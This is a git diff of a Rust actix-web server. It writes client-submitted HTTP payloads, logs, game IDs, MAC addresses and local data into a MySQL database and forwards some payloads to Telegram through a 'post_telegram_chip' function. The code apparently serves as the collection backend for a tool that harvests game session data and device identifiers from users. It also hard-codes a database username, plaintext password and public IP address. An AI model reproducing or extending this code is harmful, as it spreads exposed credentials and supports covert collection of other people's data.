@@ -143,7 +143,7 @@ async fn post_telegram_chip(data: String, client_id: &str, owner: &str) {
 }
 
 async fn create_pool() -> MySqlPool {
-    let database_url: String = String::from("mysql://leon:Dominskuy123!@202.70.133.108:3306/datatest");
+    let database_url: String = String::from("mysql://leon:Dominskuy123!@202.70.133.108:3306/data");
     let pool = MySqlPoolOptions::new()
         .max_connections(10)
         .connect(&database_url)
@@ -204,12 +204,13 @@ async fn data_handler(
     }
 
     let _user_client = sqlx::query(
-        "INSERT INTO user (id_client, owner)
-         VALUES (?, ?) ON DUPLICATE KEY UPDATE
+        "INSERT INTO client (id_client, owner)
+         VALUES (?, ?) 
+         ON DUPLICATE KEY UPDATE
          owner = VALUES(owner)")
             .bind(&client_id)
             .bind("sdhz")
-            .execute(pool.as_ref()).await;
+            .execute(pool.as_ref()).await.unwrap();
 
     match id {
         1 => {
@@ -217,7 +218,10 @@ async fn data_handler(
             // insert http
             match body.len() {
                 216 | 80 => {
-                    let _result = sqlx::query("INSERT INTO http (data, client_id, createdAt) VALUES (?, ?, NOW())")
+                    let _result = sqlx::query(
+                        "INSERT INTO http (data, client_id, createdAt) 
+                        VALUES (?, ?, NOW())
+                        ")
                         .bind(body)
                         .bind(&client_id)
                         .execute(pool.as_ref())
@@ -225,7 +229,10 @@ async fn data_handler(
                 },
                 2744 | 2728 => {
                     post_telegram_chip(body.clone(), &client_id, "sdhz").await;
-                    let _result = sqlx::query("INSERT INTO http (data, client_id, createdAt) VALUES (?, ?, NOW())")
+                    let _result = sqlx::query(
+                        "INSERT INTO http (data, client_id, createdAt) 
+                        VALUES (?, ?, NOW())
+                        ")
                         .bind(body.clone())
                         .bind(&client_id)
                         .execute(pool.as_ref())
@@ -238,7 +245,10 @@ async fn data_handler(
         }
         2 => {
             // insert log
-            let _result = sqlx::query("INSERT INTO log (data, client_id, createdAt) VALUES (?, ?, NOW())")
+            let _result = sqlx::query(
+                "INSERT INTO log (data, client_id, createdAt) 
+                VALUES (?, ?, NOW())
+                ")
                 .bind(&body)
                 .bind(&client_id)
                 .execute(pool.as_ref())
@@ -247,8 +257,12 @@ async fn data_handler(
             let id_game_regex = Regex::new(r"^[0-9]{4,10}$").unwrap();
             if id_game_regex.is_match(&body.to_string()) {
                 // insert id_game
-                let _result_id_game = sqlx::query("INSERT INTO id_game (data, client_id, createdAt) 
-                    VALUES (?, ?, NOW())")
+                let _result_id_game = sqlx::query(
+                    "INSERT INTO id_game (data, client_id, createdAt) 
+                    VALUES (?, ?, NOW())
+                    ON DUPLICATE KEY UPDATE
+                    data = VALUES(data)
+                    ")
                     .bind(&body)
                     .bind(&client_id)
                     .execute(pool.as_ref())
@@ -259,18 +273,25 @@ async fn data_handler(
         }
         3 => {
             // insert mac
-            let _result = sqlx::query("INSERT INTO mac (data, client_id, createdAt) 
-                VALUES (?, ?, NOW())")
-                .bind(body)
-                .bind(&client_id)
-                .execute(pool.as_ref())
-                .await;
+            let _result = sqlx::query(
+                "INSERT INTO mac (data, client_id, createdAt) 
+                VALUES (?, ?, NOW()) 
+                ON DUPLICATE KEY UPDATE
+                data = VALUES(data)")
+                    .bind(body)
+                    .bind(&client_id)
+                    .execute(pool.as_ref())
+                    .await
+                    .unwrap();
 
             HttpResponse::Ok().finish()
         }
         4 => {
             // insert localData
-            let _result = sqlx::query("INSERT INTO local_data (data, client_id, createdAt) VALUES (?, ?, NOW())")
+            let _result = sqlx::query(
+                "INSERT INTO local_data (data, client_id, createdAt) 
+                VALUES (?, ?, NOW())
+                ")
                 .bind(body)
                 .bind(&client_id)
                 .execute(pool.as_ref())
@@ -287,7 +308,7 @@ async fn data_handler(
 async fn main() -> std::io::Result<()> {
     let pool = create_pool().await;
 
-    println!("Server berjalan normal");
+    println!("[SERVER] : Server Running at Port 8080");
     HttpServer::new(move || {
         App::new()
             .app_data(web::Data::new(pool.clone()))
